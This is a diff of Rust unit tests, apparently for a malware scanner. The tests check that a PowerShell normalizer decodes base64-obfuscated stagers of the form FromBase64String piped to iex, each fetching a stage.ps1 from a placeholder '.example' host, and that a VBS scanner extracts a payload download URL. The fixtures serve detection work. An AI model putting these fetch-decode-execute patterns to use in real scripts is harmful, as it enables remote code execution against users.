@@ -8571,6 +8571,116 @@ iex $stage
     }
 
     #[test]
+    fn ps1_normalization_decodes_trimmed_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-trim.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = ' {b64} '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.Trim())); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-trim.example/stage.ps1"),
+            "trimmed base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob.Trim())"),
+            "trimmed base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_trimmed_getstring_base64_literal() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-lit-trim.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(' {b64} '.Trim())) | iex"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-lit-trim.example/stage.ps1"),
+            "trimmed base64 literal script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String('"),
+            "trimmed base64 literal GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($blob))); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-paren.example/stage.ps1"),
+            "parenthesized base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(($blob))"),
+            "parenthesized base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_trimend_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-trimend.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}   '; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob.TrimEnd())); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-trimend.example/stage.ps1"),
+            "TrimEnd base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String($blob.TrimEnd())"),
+            "TrimEnd base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_literal() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-lit-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(('{b64}'))) | iex"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-lit-paren.example/stage.ps1"),
+            "parenthesized base64 literal script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(('"),
+            "parenthesized base64 literal GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_escapes_binary_controls() {
         let normalized = crate::ps1_scan::normalize_ps1_text("Invoke-Expression 'A\0B\x01C'\r\n");
         assert!(
@@ -9857,6 +9967,28 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS variable concatenated URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_inline_commented_binding() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = "http://vbs-inline-comment.example/payload.txt" ' staging URL
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-inline-comment.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS inline-commented URL binding: {:?}",
             env.traits
         );
     }
